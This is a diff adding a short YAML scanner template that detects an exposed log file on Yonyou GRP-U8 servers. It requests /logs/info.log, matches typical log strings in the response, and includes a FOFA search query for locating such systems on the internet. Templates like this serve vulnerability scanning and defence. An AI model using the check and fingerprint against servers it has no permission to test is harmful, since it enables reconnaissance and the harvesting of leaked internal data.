@@ -1,0 +1,15 @@
+id: poc-yaml-yongyou-grp-u8-log-info-leak
+info:
+  name: 用友GRP-U8 log 日志信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: GRP-U8
+  fofa: app="用友-GRP-U8"
+requests:
+- method: GET
+  path: /logs/info.log
+  expression: status_code == 200 && contains(body,"[ INFO ]") && contains(body,"SET
+    NOCOUNT OFF") && contains(body,"http-apr") && contains(body,"[DataSetProviderData]")
+variables: {}
+transport: http
